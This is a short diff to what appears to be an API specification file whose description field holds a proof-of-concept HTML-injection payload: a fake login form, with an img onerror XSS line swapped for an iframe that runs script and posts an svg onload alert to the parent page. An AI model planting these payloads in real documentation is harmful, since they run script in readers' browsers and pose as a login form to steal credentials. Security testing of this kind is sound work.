@@ -4,10 +4,10 @@ info:
   title: Fake Login Page
   description: '<div class="login-form">
     <div class="heading">
-        <h1>HTML Injection : Fake Login</h1> (PoC d0ug) <img src=x onerror="[...{ [Symbol.iterator]: () => ({ next: () => ({ done: true }) }) }, alert(document.domain)]">
+        <h1>HTML Injection : Fake Login</h1> (PoC d0ug)
 
     </div>
-    <img src=x onerror="[...{ [Symbol.iterator]: () => ({ next: () => ({ done: true }) }) }, alert(document.domain)]">
+    <iframe src="data:text/html,<script>parent.postMessage('<svg onload=alert(1)>', '*')</script>"></iframe>
 
     <div class="form-container">
         <form action="https://example.com/login" method="post" class="form-signin">
